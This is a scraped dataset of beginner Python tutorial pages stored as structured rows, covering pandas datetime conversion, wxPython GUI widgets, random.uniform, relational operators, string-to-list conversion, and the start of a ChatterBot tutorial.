pnd', '# Creating the dataframe', ""data_frame = pnd.DataFrame({'Date':['12/05/2021', '11/21/2018', '01/12/2020'],"", ""'Event':['Music- Dance', 'Poetry- Songs', 'Theatre- Drama'],"", ""'Cost':[15400, 7000, 25000]})"", '# Print the dataframe', 'print (""The data is: "")', 'print (data_frame)', ""# For converting the 'Date' column of DataFrame into datetime format"", ""data_frame['Date'] = pnd.to_datetime(data_frame['Date'])"", ""# Here, we are checking the data type of the 'Date' column"", 'data_frame.info()', 'import pandas as pnd', '# Creating the dataframe', ""data_frame = pnd.DataFrame({'Date':['12/05/2021', '11/21/2018', '01/12/2020'],"", ""'Event':['Music- Dance', 'Poetry- Songs', 'Theatre- Drama'],"", ""'Cost':[15400, 7000, 25000]})"", '# Print the dataframe', 'print (""The data is: "")', 'print (data_frame)', ""# Here, we are checking the data type of the 'Date' column"", 'data_frame.info()', 'import pandas as pnd', '# Creating the dataframe', ""data_frame = pnd.DataFrame({'Date':['12/05/2021', '11/21/2018', '01/12/2020'],"", ""'Event':['Music- Dance', 'Poetry- Songs', 'Theatre- Drama'],"", ""'Cost':[15400, 7000, 25000]})"", '# Print the dataframe', 'print (""The data is: "")', 'print (data_frame)', ""# For converting the 'Date' column of DataFrame into datetime format"", ""data_frame['Date'] = data_frame['Date'].astype('datetime64[ns]')"", ""# Here, we are checking the data type of the 'Date' column"", 'data_frame.info()', 'import pandas as pnd', '# Now, we will initialize the nested list with Dataset', ""play_list = [['210302', 67000], ['210901', 62000], ['210706', 61900],"", ""['210402', 59000], ['210802', 74000],"", ""['210804', 54050], ['210109', 57650], ['210509', 67300], ['210209', 76600]]"", '# Creating a pandas DataFrame', ""data_frame = pnd.DataFrame(play_list,columns = ['Date','Patient Number'])"", '# Print the dataframe', 'print (""The data is: "")', 'print (data_frame)', ""# Here, we are checking the data type of the 'Date' column"", 'print (data_frame.dtypes)', 'import pandas as pnd', '# Now, we will initialize the nested list with Dataset', ""play_list = [['210302', 67000], ['210901', 62000], ['210706', 61900],"", ""['210402', 59000], ['210802', 74000],"", ""['210804', 54050], ['210109', 57650], ['210509', 67300], ['210209', 76600]]"", '# creating a pandas dataframe', ""data_frame = pnd.DataFrame(play_list,columns = ['Date','Patient Number'])"", '# Print the dataframe', 'print (""The data is: "")', 'print (data_frame)', ""# For converting the 'Date' column of DataFrame into datetime format"", ""data_frame['Date'] = pnd.to_datetime(data_frame['Date'], format = '%y%m%d')"", ""# Here, we are checking the data type of the 'Date' column"", 'print (data_frame.dtypes)', '# Initializing the nested list with Data set', ""Dataset_list = [['20210612', 54000, '20210812'],"", ""['20210814', 65000, '20210614'],"", ""['20210316', 71500, '20210316'],"", ""['20210519', 45000, '20210119'],"", ""['20210221', 98000, '20210221'],"", ""['20210124', 23000, '20210724'],"", ""['20210929', 12000, '20210924']]"", '# creating a pandas dataframe', 'data_frame = pnd.DataFrame(', ""Dataset_list, columns = ['Treatment_starting_Date',"", ""'Patients Number',"", ""'Treatment_ending_Date'])"", '# Print the dataframe', 'print (""The data is: "")', 'print (data_frame)', ""# Here, we are checking the data type of the 'Date' column"", 'print (data_frame.dtypes)', 'import pandas as pnd', '# Initializing the nested list with Data set', ""Dataset_list = [['20210612', 54000, '20210812'],"", ""['20210814', 65000, '20210614'],"", ""['20210316', 71500, '20210316'],"", ""['20210519', 45000, '20210119'],"", ""['20210221', 98000, '20210221'],"", ""['20210124', 23000, '20210724'],"", ""['20210929', 12000, '20210924']]"", '# creating a pandas dataframe', 'data_frame = pnd.DataFrame(', ""Dataset_list, columns = ['Treatment_starting_Date',"", ""'Patients Number',"", ""'Treatment_ending_Date'])"", '# Print the dataframe', 'print (""The data is: "")', 'print (data_frame)', '# For converting the multiple columns of DataFrame into datetime format', ""data_frame['Treatment_starting_Date'] = pnd.to_datetime("", ""data_frame['Treatment_starting_Date'],"", ""format = '%Y%m%d'"", ""data_frame['Treatment_ending_Date'] = pnd.to_datetime("", ""data_frame['Treatment_ending_Date'],"", ""format = '%Y%m%d'"", ""# Here, we are checking the data type of the 'Date' column"", 'print (data_frame.dtypes)']","['The data is:', 'Date           Event                     Cost', '0  12/05/2021    Music- Dance  15400', '1  11/21/2018   Poetry- Songs   7000', '2  01/12/2020  Theatre- Drama  25000', 'RangeIndex: 3 entries, 0 to 2', 'Data columns (total 3 columns):', '#   Column  Non-Null Count  Dtype', '---  ------  --------------  -----', '0   Date    3 non-null      object', '', '1   Event   3 non-null      object', '2   Cost    3 non-null      int64', 'dtypes: int64(1), object(2)', 'memory usage: 200.0+ bytes', 'The data is:', 'Date           Event                     Cost', '0  12/05/2021    Music- Dance  15400', '1  11/21/2018   Poetry- Songs   7000', '2  01/12/2020  Theatre- Drama  25000', ""<class 'pandas.core.frame.DataFrame'>"", 'RangeIndex: 3 entries, 0 to 2', 'Data columns (total 3 columns):', '#   Column  Non-Null Count  Dtype', '---  ------  --------------  -----', '0   Date    3 non-null      datetime64[ns]', '', '1   Event   3 non-null      object', '2   Cost    3 non-null      int64', 'dtypes: datetime64[ns](1), int64(1), object(1)', 'memory usage: 200.0+ bytes', 'The data is:', 'Date           Event                     Cost', '0  12/05/2021    Music- Dance  15400', '1  11/21/2018   Poetry- Songs   7000', '2  01/12/2020  Theatre- Drama  25000', ""<class 'pandas.core.frame.DataFrame'>"", 'RangeIndex: 3 entries, 0 to 2', 'Data columns (total 3 columns):', '#   Column  Non-Null Count  Dtype', '---  ------  --------------  -----', '0   Date    3 non-null      object', '', '1   Event   3 non-null      object', '2   Cost    3 non-null      int64', 'dtypes: int64(1), object(2)', 'memory usage: 200.0+ bytes', 'The data is:', 'Date           Event   Cost', '0  12/05/2021    Music- Dance  15400', '1  11/21/2018   Poetry- Songs   7000', '2  01/12/2020  Theatre- Drama  25000', ""<class 'pandas.core.frame.DataFrame'>"", 'RangeIndex: 3 entries, 0 to 2', 'Data columns (total 3 columns):', '#   Column  Non-Null Count  Dtype', '---  ------  --------------  -----', '0   Date    3 non-null      datetime64[ns]', '1   Event   3 non-null      object', '2   Cost    3 non-null      int64', 'dtypes: datetime64[ns](1), int64(1), object(1)', 'memory usage: 200.0+ bytes', 'The data is:', 'Date          Patient Number', '0  210302           67000', '1  210901           62000', '2  210706           61900', '3  210402           59000', '4  210802           74000', '5  210804           54050', '6  210109           57650', '7  210509           67300', '8  210209           76600', 'Date              object', 'Patient Number     int64', 'dtype: object', 'The data is:', 'Date         Patient Number', '0  210302           67000', '1  210901           62000', '2  210706           61900', '3  210402           59000', '4  210802           74000', '5  210804           54050', '6  210109           57650', '7  210509           67300', '8  210209           76600', 'Date              datetime64[ns]', 'Patient Number             int64', 'dtype: object', 'The data is:', 'Treatment_starting_Date   Patients Number     Treatment_ending_Date', '0   20210612                54000                20210812', '1   20210814                65000                20210614', '2   20210316                71500                20210316', '3   20210519                45000                20210119', '4   20210221                98000                20210221', '5   20210124                23000                20210724', '6   20210929                12000                20210924', 'Treatment_starting_Date    object', 'Patients Number             int64', 'Treatment_ending_Date      object', 'dtype: object', 'The data is:', 'Treatment_starting_Date  Patients Number Treatment_ending_Date', '0                20210612            54000              20210812', '1                20210814            65000              20210614', '2                20210316            71500              20210316', '3                20210519            45000              20210119', '4                20210221            98000              20210221', '5                20210124            23000              20210724', '6                20210929            12000              20210924', 'Treatment_starting_Date    datetime64[ns]', 'Patients Number                     int64', 'Treatment_ending_Date      datetime64[ns]', 'dtype: object']",[],[]
350,['Python | wxPython Module'],"[""We all would have wondered what makes an application different and attractive in the very first place? If any of us is thinking about the application's User Interface, yes, we are right. The User Interface of the application makes a huge difference in the number of people who are coming to visit the application. An interactive User Interface allows the developers to build more attractive and relatable applications that even stand out better in the market. Also, an application with interactive UI makes its user stay more on the application than an application with a standard UI.""]","['https://www.javatpoint.com/random-uniform-python', 'https://www.javatpoint.com/convert-the-column-type-from-string-to-datetime-format-in-pandas-dataframe', 'https://www.javatpoint.com/random-uniform-python', 'https://www.javatpoint.com/convert-the-column-type-from-string-to-datetime-format-in-pandas-dataframe', 'https://www.javatpoint.com/random-uniform-python']","['https://static.javatpoint.com/python/images/python-wxpython-module.png', 'https://static.javatpoint.com/python/images/python-wxpython-module2.png', 'https://static.javatpoint.com/python/images/python-wxpython-module3.png', 'https://static.javatpoint.com/python/images/python-wxpython-module4.png', 'https://static.javatpoint.com/python/images/python-wxpython-module5.png', 'https://static.javatpoint.com/python/images/python-wxpython-module6.png']",[],['Python wxPython Module'],"['Introduction: wxPython Module', 'Installation: wxPython module', 'Working: wxPython module']",[],"['We have to keep all the points mentioned above in our minds and implement them while creating a user interface for an application.', 'We can see wxPython is successfully installed on our device, and now we can start working with it and build GUIs using its functions.', 'Look at the following example programs to understand the working of the wxPython module:', 'Example 1: Creating a simple GUI having the title ""Welcome to JavaTpoint"", using wxPython module:', 'Explanation:', 'We can see the GUI application window in the output when the program is executed, and it has the static text and title object in it.', 'Example 2: Creating a button in the GUI application using the wxPython module in a program:', 'Explanation:', 'Example 3: Creating two check boxes in the GUI application using the wxPython module in a program:', 'Explanation:', 'Example 4: Creating radio buttons in the GUI application using the wxPython module in a program:', 'Explanation:']","['When we press the enter key after writing the command, the pip installer will start the installation process of the wxPython module, and after a while, it will be successfully installed in our system.', 'In this section, we will create some basic GUIs with the help of functions of the wxPython module by importing this module into the program. To import the wxPython module in a Python program, we have to use the following line of code:']","['Now, a question will surely come to our mind: what makes the UI of any application more interactive and more attractive to its users. So, there are few important points that make the interface more attractive and likeable for users. Following are such few points that make the UI of an application more attractive and appealing to its users:', 'In one of the points we have mentioned above, we talked about graphics in the user interface, which makes the interface of an application more attractive. Such UIs that are built with graphics is called a GUI (Graphical User Interface). GUI is a very popular topic nowadays as it has become an essential part of almost every application we see around us. GUI provides graphical icons and audio indicators as well, which makes the application more attractive and appealing to users. In this tutorial, we will learn about a Python module, i.e., wxPython Module, which provides us with the functionalities to create GUI for an application. We will only cover the introduction part of the wxPython module and will create GUI by using this module inside a Python program.', 'wxPython module, as the name suggests, is a module of Python that help us in creating highly functional and very interactive GUIs for applications. wxPython module is an open-source module which means it is freely available for everyone, and anyone can look and contribute to the source code by modifying it. When we use the wxPython module in Python, it is implemented as a set of extension modules. This set of extension modules wraps the GUI components of the wxWidgets library, which is written in C++.', 'The wxWidgets library in the wxPython module works like a cross-platform GUI toolkit in Python that allows us to use its functions to create highly functional and interactive GUIs. Pheonix with the Pheonix version is actually a next-generation upgraded version of the wxPython module for Python. This next-generation version of the wxPython module mainly focuses on the extensibility, speed and maintainability of the application.', ""The wxPython module doesn't come in-built inside Python, and therefore we have to install it first before we start working with it. To install the wxPython module in our system, we will use the pip installer from the command prompt. We will use the following pip command in the command prompt terminal of the device to install the wxPython module in the system:"", ""Here, wx will call the wxPython module from our system, and that's how we will be able to use its functions in the program. Now, we will see some different examples where we will create some basic GUIs like GUI with a button, GUI with radio buttons etc."", 'We have firstly imported the wxPython module into the program to use its functions. Then, we used the App() function to create an Object for the GUI application. After that, we have created a frame object of GUI and panel for frame object using the Frame() and Panel() function, respectively. Inside the frame object we created, we set the title of the GUI application object as ""Welcome to JavaTpoint."" After that, we added a static text using StaticText() function inside the frame of the GUI application that should be displayed while opening the GUI application window in the output. Inside the StaticText() function, we used the pos() function as a parameter of it set the position of static text in the GUI display. Then, we used the show() function with the frame object we created to show it. Finally, we started the MainLoop() function with the GUI application object to display this GUI application when we execute the program.', 'After creating the frame object of the GUI application and panel for the frame object, we have created two buttons inside the GUI application we built, using the Button() function provided by the wxPython module. We used the panel object inside the Button() object as a parameter. We have also used the pos() function here in the Button() to set the position of the button inside the frame of the GUI application. After that, we displayed the GUI application in the output, and we can see the buttons we created in the GUI application window.', 'After creating the frame object of the GUI application and panel for the frame object, we created two checkboxes inside the frame object. We used the CheckBox() function to create these two CheckBoxes and gave them the name ""First Check Box"" and ""Second Check Box."" We used the position function parameter in the CheckBox() function to set the positions of checkboxes in the frame of the GUI application. After that, we displayed the GUI application in the output, and we can see the checkboxes we created in the GUI application window.', 'After creating the frame object of the GUI application and panel for the frame object, we created multiple radio buttons inside the frame of the GUI application. We used RadioButton() function to create these Radio buttons and gave them name as ""First Radio Button"", ""Second Radio Button"", and ""Third Radio Button."" We used the position function parameter in the RadioButton() function to set the positions of radio buttons in the frame object of the GUI application. After that, we displayed the GUI application in the output, and we can see the radio buttons we created in the GUI application window.']","['pip install wxPython', 'import wx', '# Importing wxPython module', 'import wx', '# Creating an object for GUI application', 'appGUI = wx.App()', '# Create a frame for application', 'frmGUI = wx.Frame(None, title =""Welcome to JavaTpoint!"")', 'panelGUI = wx.Panel(frmGUI) # Panel for the frame of the application', '# Adding static text inside the frame object of the application', 'text1 = wx.StaticText(panelGUI, label =""Hello Python Developers! You all are welcomed at JavaTpoint"", pos = (120, 60))', '# Show the frame object', 'frmGUI.Show()', '# Start Event loop to display application', 'appGUI.MainLoop()', '# Importing wxPython module', 'import wx', '# Creating an object for GUI application', 'appGUI = wx.App()', '# Create a frame for application', 'frmGUI = wx.Frame(None, title =""Welcome to JavaTpoint!"")', 'panelGUI = wx.Panel(frmGUI) # Panel for frame of application', '# Creating two buttons in the application', 'e = wx.Button(panelGUI, -1, ""First Button"", pos = (180, 120))', 'e = wx.Button(panelGUI, -1, ""Second Button"", pos = (180, 150))', '# Show the frame object', 'frmGUI.Show()', '# Start Event loop to display application', 'appGUI.MainLoop()', '# Importing wxPython module', 'import wx', '# Creating an object for GUI application', 'appGUI = wx.App()', '# Create a frame for application', 'frmGUI = wx.Frame(None, title =""Welcome to JavaTpoint!"")', 'panelGUI = wx.Panel(frmGUI) # Panel for frame of application', '# Creating two check boxes inside the frame object of GUI application', 'e = wx.CheckBox(panelGUI, -1, ""First Check Box"", pos = (160, 130))', 'e = wx.CheckBox(panelGUI, -1, ""Second Check Box"", pos = (160, 150))', '# Show the frame object', 'frmGUI.Show()', '# Start Event loop to display application', 'appGUI.MainLoop()', '# Importing wxPython module', 'import wx', '# Creating an object for GUI application', 'appGUI = wx.App()', '# Create a frame for application', 'frmGUI = wx.Frame(None, title =""Welcome to JavaTpoint!"")', 'panelGUI = wx.Panel(frmGUI) # Panel for frame of application', '# Creating radio buttons inside the frame object of GUI application', 'e = wx.RadioButton(panelGUI, -1, ""First Radio Button"", pos = (160, 120))', 'e = wx.RadioButton(panelGUI, -1, ""Second Radio Button"", pos = (160, 140))', 'e = wx.RadioButton(panelGUI, -1, ""Third Radio Button"", pos = (160, 160))', '# Show the frame object', 'frmGUI.Show()', '# Start Event loop to display application', 'appGUI.MainLoop()']",[],[],"['|||First of all, the UI of the application should be more dynamic and have high-resolution graphics in it.|||The UI of the application should match the theme of the application.|||The UI of the application should also provide an ease of use feature for its users.|||']"
351,['Random Uniform Python'],"['In this tutorial, we will discuss the uniform() method present in the random module of Python and also how it can be used by importing NumPy.']","['https://www.javatpoint.com/relational-operators-in-python', 'https://www.javatpoint.com/python-wxpython-module', 'https://www.javatpoint.com/relational-operators-in-python', 'https://www.javatpoint.com/python-wxpython-module', 'https://www.javatpoint.com/relational-operators-in-python']",[],[],['Conclusion'],[],[],"['The uniform() returns a floating-point number or a range of numbers between the specified limits.', 'The syntax for using uniform() is-', 'Here, ""a"" represents the upper bound & b represents the lower bound.', 'Let us have a look at some examples that demonstrates its usage in Python programs.', 'The following program illustrates how it can be used in a python program-', 'Explanation-', ""Let's understand what happened in the above program-"", 'Let us have a glance at one more program where we have followed the same approach but provided the float values as upper and lower bounds.', 'Explanation-', 'The procedure is the same as the previous program but here we can observe it displays the required output even when we provide decimal values.', 'Let us see how we can use uniform() here,', 'Consider the program given below,', 'Explanation-', ""It's time to know the explanation of the above program-"", ""Now, let's check out another program-"", 'Explanation-', ""Let's understand what happened here,"", ""Finally, it's time to discuss the last program of this article,"", 'Explanation-', 'In this tutorial, we learned what is uniform() and how it can be used in various python programs.']","['We all know that the NumPy module is used in Python to carry out different mathematical operations and because of the kind of in-built functions this module provides, our code becomes less complex and more efficient.']",[],"['random.uniform(a,b)', '# Import the random module', 'import random', '# Initialize the upper and lower limits', '# Displaying the random number', 'print (""The random number between 8 and 12 is : "", end = "" "")', '#using random.uniform()', 'print(random.uniform(x,y))', '# Import the random module', 'import random', '# Initialize the upper and lower limits', 'x = 9.7', 'y = 14.3', '# Displaying the random number', 'print(""The random number between 9.7 and 14.3 is: "", end = "" "")', '#using random.uniform()', 'print(random.uniform(x,y))', '# Importing the NumPy module', 'import numpy as np', 'np.random.seed(55)', '# Creating an array of size four', 'num_arr = np.random.uniform(size = 4, low = 0, high = 1)', '# Displaying the values of array', 'print(""The resultant array is: "", num_arr)', '# Importing the numpy module', 'import numpy as np', 'np.random.seed(0)', '# Creating an array of size four', 'num_arr = np.random.uniform(size = (3, 3), low = 0, high = 1)', '#Displaying the values of array', 'print(""The resultant array is: "", num_arr)', '# Displaying the type of num_arr', 'print(type(num_arr))', '#Importing the numpy module', 'import numpy as np', 'np.random.seed(0)', '#Creating an array of size five', 'num_arr=np.random.uniform(size = 5, low = 42, high = 63)', '#Displaying the values of array', 'print(""The resultant array is: "", num_arr)', '#Displaying the type of num_arr', 'print(type(num_arr))']","['The random number between 8 and 12 is:  10.14646142251812', 'The random number between 9.7 and 14.3 is :  11.521121715281813', 'The resultant array is:  [0.09310829 0.97165592 0.48385998 0.2425227 ]', 'The resultant array is:  [[0.5488135  0.71518937 0.60276338]', '[0.54488318 0.4236548  0.64589411]', '[0.43758721 0.891773   0.96366276]]', ""<class 'numpy.ndarray'>"", 'The resultant array is:  [53.52508358 57.01897669 54.6580309  53.44254684 50.89675079]', ""<class 'numpy.ndarray'>""]",[],"['|||Since we have to use the method uniform(), we have imported the random module.|||After this, we have initialized the upper bound and the lower bound which are 8 and 12.|||Finally, we have passed these two values as the parameters in uniform().|||On executing this program, the expected output is displayed.||||||Since we have to use the method uniform(), this time we have imported the NumPy module.|||The next step is to provide a value in random.seed() since it is used to initialize the random number generator.|||After this, we have initialized the values of size of the array, upper bound and the lower bound which are 4,0 and 1 respectively inside np.random.uniform().|||We have declared num_arr using np.random.uniform() because we are generating an array here.|||On executing this program, the expected output is displayed which is an array consisting of three values.||||||Since we have to use the method uniform(), this time we have imported the NumPy module.|||The next step is to provide a value in random.seed() since it is used to initialize the random number generator.|||After this, we have initialized the values of size of the array(this time we have created a two-dimensional array), upper bound and the lower bound which are (3,3), 0 and 1 respectively inside np.random.uniform().|||We have declared num_arr using np.random.uniform() because we are generating an array here.|||On executing this program, the expected output is displayed which is an array consisting of three values and also the type of num_arr.||||||Since we have to use the method uniform(), this time we have imported the NumPy module.|||The next step is to provide a value in random.seed() since it is used to initialize the random number generator.|||After this, we have initialized the values of size of the array, upper bound, and the lower bound which are 5, 42, and 63(this time we have taken a definite range) respectively inside np.random.uniform().|||We have declared num_arr using np.random.uniform() because we are generating an array here.|||On executing this program, the expected output is displayed which is an array consisting of three values and also the type of num_arr.|||']"
352,['Relational Operators in Python'],"['In this tutorial, we will discuss how different relational operators can be used in Python programs.']","['https://www.javatpoint.com/string-to-list-in-python', 'https://www.javatpoint.com/random-uniform-python', 'https://www.javatpoint.com/string-to-list-in-python', 'https://www.javatpoint.com/random-uniform-python', 'https://www.javatpoint.com/string-to-list-in-python']",[],[],"['1. Greater or less than (>, <)', '2. Equals to (==)', '3. Not Equal to (!=)', '4. Greater than or less than equal to (>=, <=)', 'Conclusion']",[],[],"['Following are the relational operators-', ""Let's start with the first one-"", 'The program given below illustrates how it can be done-', 'Explanation-', ""It's time to have a look at the explanation of the above program-"", ""The equals to '==' operator return a True value if values stored in two variables are the same."", 'The following program illustrates its usage', 'Explanation-', ""Let's understand what happened in the above program-"", ""The not equals to '!=' operator returns a True value if values stored in two variables are different."", 'Consider the program given below-', 'Explanation-', ""Let's have a glance at the explanation of the above program-"", 'Finally, we will discuss the last relational operator which is greater than equal to or less than equal to.', ""The greater than equal to returns 'True' if the value in any of the two variables is greater than or equal to the second one."", ""The 'lesser than equal to' works in a similar way."", 'Let us see how it can be used in a Python program,', 'Explanation-', 'The program given below illustrates how it can be done-', 'In this tutorial, we learned how relational operators can be used in a Python program.']","['The relational operators are also known as comparison operators, their main function is to return either a true or false based on the value of operands.']",[],"['# Initializing the value of a and b', '# Calculating the sum of a and b', 'c = a + b', 'print (""The sum of a and b is "", c)', '# Using relational operators', 'print (a > b)', 'print (a < b)', 'print (c < a)', 'print (c > b)', '# Initializing the value of a and b', '#calculating the sum of a and b', 'c = a + b', 'e = d - b', 'print (""The sum of a and b is "", c)', 'print (""The difference of d and b is "", e)', '# Using relational operators', 'print (a > b)', 'print (a < b)', 'print (c == d)', 'print (e == a)', '# Initializing the value of a and b', '# Calculating the sum of a and b', 'c = a + b', 'e = d - b', 'print(""The sum of a and b is "", c)', 'print(""The difference of d and b is "", e)', '# Using relational operators', 'print(a > b)', 'print(a != b)', 'print(c!=d)', 'print(e==a)', '# Initializing the value of a and b', '# Calculating the sum of a and b', 'c = a + b', 'e = d - b', 'print(""The sum of a and b is "", c)', 'print(""The difference of d and b is "", e)', '# Using relational operators', 'print(a >= b)', 'print(a != b)', 'print(c <= d)', 'print(e == a)']","['The sum of a and b is 30', 'True', 'False', 'False', 'True', 'The sum of a and b is 30', 'The difference of d and b is 20', 'True', 'False', 'True', 'True', 'The sum of a and b is 30', 'The difference of d and b is 20', 'True', 'True', 'False', 'True', 'The sum of a and b is 30', 'The difference of d and b is 20', 'True', 'True', 'True', 'True']",[],"[""|||>|||<|||==|||!=|||>=|||<=||||||In the first step, we have initialized the values of the variables of a and b is 20 and 10.|||In the next step, we have calculated the sum of a and b.|||Finally, we printed the values evaluated based on greater than or less than.|||If a is greater than b, it gives the output as 'True', else it gives 'False' and vice versa.|||On executing the given program, the desired output is displayed.||||||In the first step, we have initialized the values of the variables of a and b is 20 and 10.|||In the next step, we have calculated the sum of a and b and the difference of d and b.|||Finally, we printed the values evaluated based on greater than, less than, and equals to.|||If c is equal to d, it gives the output as 'True', else it gives 'False' and vice versa.|||On executing the given program, the desired output is displayed.||||||In the first step, we have initialized the values of the variables of a and b is 20 and 10.|||In the next step, we have calculated the sum of a and b and the difference of d and b.|||Finally, we printed the values evaluated based on greater than, less than, equals to, and not equals to.|||If a is not equal to b, it gives the output as 'True', else it gives 'False' and vice versa.|||On executing the given program, the desired output is displayed.||||||In the first step, we have initialized the values of the variables of a and b is 20 and 10.|||In the next step, we have calculated the sum of a and b and the difference of d and b.|||Finally, we printed the values evaluated based on greater than, less than, equals to, not equals to, greater than equal to, and less than equal to.|||If a is greater than equal to b, it gives the output as 'True', else it gives 'False' and vice versa.|||On executing the given program, the desired output is displayed.|||""]"
353,['String to List in Python'],"['So far, we have discussed various conversions in Python. In this tutorial, we will learn another one, which is converting a string to a list in Python.']","['https://www.javatpoint.com/chatbot-in-python', 'https://www.javatpoint.com/relational-operators-in-python', 'https://www.javatpoint.com/chatbot-in-python', 'https://www.javatpoint.com/relational-operators-in-python', 'https://www.javatpoint.com/chatbot-in-python']",[],[],"['Using split()', 'Using split() with a Separator', 'Using strip()', 'Convert Strings to List of Lists using map()', 'Converting String of Integers', 'Conclusion']",[],[],"['We will use the following methods to meet our objective-', 'Let us discuss each one of them.', 'In the first program, we will make use of split() to convert the string to a list in Python.', 'The program given below illustrates how it can be done.', 'Explanation-', 'In the second program, we have specified a separator in split().', 'Consider the given program,', 'Explanation-', 'The approach is similar to the previous program, the only difference it takes an element in the list whenever a separator occurs.', 'In this program, the separators in the strings were @, #, $ & %.', ""Now, let's see how to strip() can be used."", 'The following program illustrates the same-', 'Explanation-', 'Explanation-', 'Finally, in the last program we have used the string of integers,', 'Consider the program given below,', 'Explanation-', ""The logic is similar to the above program but here we have passed a string of integers and applied the 'int' functionality on all the elements."", 'In this tutorial, we learned the simple techniques of converting a string to a list in Python.']",[],[],"['# Initialising the string values', 'str_val1 = ""Let us study programming.""', 'str_val2 = ""But before that it is essential to have a basic knowledge of computers.""', 'str_val3 = ""So first study what is IPO cycle.""', 'str_val4 = ""Then learn about the generation of computers.""', '#using split()', 'print(str_val1.split())', 'print(str_val2.split())', 'print(str_val3.split())', 'print(str_val4.split())', '# Initializing the string values', 'str_val1=""Let @ us @ study @ programming.""', 'str_val2=""But # before # that # it # is # essential # to # have # a # basic # knowledge # of # computers.""', 'str_val3=""So $ first $ study $ what $ is $ IPO $ cycle.""', 'str_val4=""Then % learn % about % the % generation % of % computers.""', '# Using split()', 'print(str_val1.split(""@""))', 'print(str_val2.split(""#""))', 'print(str_val3.split(""$""))', 'print(str_val4.split(""%""))', '# Initialising the string values', 'str_val1 = ""Let us study programming.""', 'str_val2 = ""But before that it is essential to have a basic knowledge of computers.""', '# Using list()', 'print(list(str_val1.strip()))', 'print(list(str_val2.strip()))', '# Initializing the string values', 'str_val1=""Let us study programming.""', 'str_val2=""But before that it is essential to have a basic knowledge of computers.""', '#using split()', 'str_val1 = str_val1.split()', 'str_val2 = str_val2.split()', 'list_str1 = list(map(list,str_val1))', 'list_str2 = list(map(list,str_val2))', '#displaying the list values', 'print(list_str1)', 'print(list_str2)', '#initialising the string values', 'str_val1 = ""1 2 3 4 5 6 7 8 9""', 'str_val2 = ""12 21 32 44 54 76 83""', '#using split()', 'str_val1 = str_val1.split()', 'str_val2 = str_val2.split()', 'list_str1 = list(map(int,str_val1))', 'list_str2 = list(map(int,str_val2))', '#displaying the list values', 'print(list_str1)', 'print(list_str2)']","[""['Let', 'us', 'study', 'programming.']"", ""['But', 'before', 'that', 'it', 'is', 'essential', 'to', 'have', 'a', 'basic', 'knowledge', 'of', 'computers.']"", ""['So', 'first', 'study', 'what', 'is', 'IPO', 'cycle.']"", ""['Then', 'learn', 'about', 'the', 'generation', 'of', 'computers.']"", ""['Let ', ' us ', ' study ', ' programming.']"", ""['But ', ' before ', ' that ', ' it ', ' is ', ' essential ', ' to ', ' have ', ' a ', ' basic ', ' knowledge ', ' of ', ' computers.']"", ""['So ', ' first ', ' study ', ' what ', ' is ', ' IPO ', ' cycle.']"", ""['Then ', ' learn ', ' about ', ' the ', ' generation ', ' of ', ' computers.']"", ""['L', 'e', 't', ' ', 'u', 's', ' ', 's', 't', 'u', 'd', 'y', ' ', 'p', 'r', 'o', 'g', 'r', 'a', 'm', 'm', 'i', 'n', 'g', '.']"", ""['B', 'u', 't', ' ', 'b', 'e', 'f', 'o', 'r', 'e', ' ', 't', 'h', 'a', 't', ' ', 'i', 't', ' ', 'i', 's', ' ', 'e', 's', 's', 'e', 'n', 't', 'i', 'a', 'l', ' ', 't', 'o', ' ', 'h', 'a', 'v', 'e', ' ', 'a', ' ', 'b', 'a', 's', 'i', 'c', ' ', 'k', 'n', 'o', 'w', 'l', 'e', 'd', 'g', 'e', ' ', 'o', 'f', ' ', 'c', 'o', 'm', 'p', 'u', 't', 'e', 'r', 's', '.']"", ""[['L', 'e', 't'], ['u', 's'], ['s', 't', 'u', 'd', 'y'], ['p', 'r', 'o', 'g', 'r', 'a', 'm', 'm', 'i', 'n', 'g', '.']]"", ""[['B', 'u', 't'], ['b', 'e', 'f', 'o', 'r', 'e'], ['t', 'h', 'a', 't'], ['i', 't'], ['i', 's'], ['e', 's', 's', 'e', 'n', 't', 'i', 'a', 'l'], ['t', 'o'], ['h', 'a', 'v', 'e'], ['a'], ['b', 'a', 's', 'i', 'c'], ['k', 'n', 'o', 'w', 'l', 'e', 'd', 'g', 'e'], ['o', 'f'], ['c', 'o', 'm', 'p', 'u', 't', 'e', 'r', 's', '.']]"", '[1, 2, 3, 4, 5, 6, 7, 8, 9]', '[12, 21, 32, 44, 54, 76, 83]']",[],"['|||Using split()|||Using split() with a separator|||Using strip()|||Using map()||||||In the first step, we have initialized the four strings that we would like to convert.|||After this, we have used the split() so that we obtain a list in which each word of a string represents an element of the list.||||||In the first step, we have initialized the two strings that we would like to convert.|||After this, we have used the strip() so that we obtain a list, where each character represents of the string represents an element in the list.||||||In the first step, we have initialized the two strings that we would like to convert.|||After this, we have used the split() method followed by map() so that we map the list functionality to each element of the string.|||On executing the given program, the desired output is displayed.|||']"
354,['Chatbot in Python'],"['In the past few years, chatbots in the Python programming language have become enthusiastically admired in the sectors of technology and business. These intelligent bots are so adept at imitating natural human languages and chatting with humans that companies across different industrial sectors are accepting them. From e-commerce industries to healthcare institutions, everyone appears to be leveraging this nifty utility to drive business advantages. In the following tutorial, we will understand the chatbot with the help of the Python programming language and discuss the steps to create a chatbot in Python.']","['https://www.javatpoint.com/how-to-convert-float-to-int-in-python', 'https://www.javatpoint.com/string-to-list-in-python', 'https://www.javatpoint.com/how-to-convert-float-to-int-in-python', 'https://www.javatpoint.com/string-to-list-in-python', 'https://www.javatpoint.com/how-to-convert-float-to-int-in-python']",[],[],"['Understanding the Chatbot', 'Chatbot in present Generation', 'Understanding the ChatterBot Library', 'Understanding the working of the ChatterBot library', 'Creating a Chatbot using Python', 'Complete Project Code']","['Preparing the Dependencies', 'Creating and Training the Chatbot', 'Communicating with the Python chatbot', 'Training the Python Chatbot using a Corpus of Data']",[],"['We can categorize the Chatbots into two primary variants: Rule-Based Chatbots and Self-Learning Chatbots.', ""So, let's get begun!"", 'We will follow a step-by-step approach and break down the procedure of creating a Python chat.', 'Another major section of the chatbot development procedure is developing the training and testing datasets.', 'Now that we have understood the fundamental concepts of chatbot development we need in Python, let us start with the actual process!', 'If some of us would like to upgrade the library, we can use the following command', 'Now that the setup is ready, we can move on to the next step in order to create a chatbot using the Python programming language.', 'Importing the Classes', 'The second step in the Python chatbot development procedure is to import the required classes.', 'Let us consider the following snippet of code to understand the same.', 'File: my_chatbot.py', 'Explanation:', 'In the above snippet of code, we have imported two classes - ChatBot from chatterbot and ListTrainer from chatterbot.trainers.', 'Let us consider the following snippet of code for the same.', 'File: 